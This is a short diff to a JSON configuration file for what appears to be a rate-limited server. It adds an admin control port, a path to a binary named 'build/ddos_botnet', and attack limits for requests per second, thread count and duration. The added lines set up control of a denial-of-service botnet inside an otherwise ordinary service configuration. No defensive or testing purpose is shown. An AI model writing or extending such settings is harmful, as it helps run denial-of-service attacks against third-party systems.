@@ -5,5 +5,11 @@
   "worker_threads": 4,
   "rate_limit_max_rps": 20,
   "rate_limit_block_seconds": 10,
-  "rate_limit_algorithm": "token_bucket"
+  "rate_limit_algorithm": "token_bucket",
+  "admin_control_port": 9091,
+  "botnet_binary_path": "build/ddos_botnet",
+  "attack_max_rps": 1000,
+  "attack_max_threads": 64,
+  "attack_max_duration": 300,
+  "admin_read_timeout_s": 5
 }
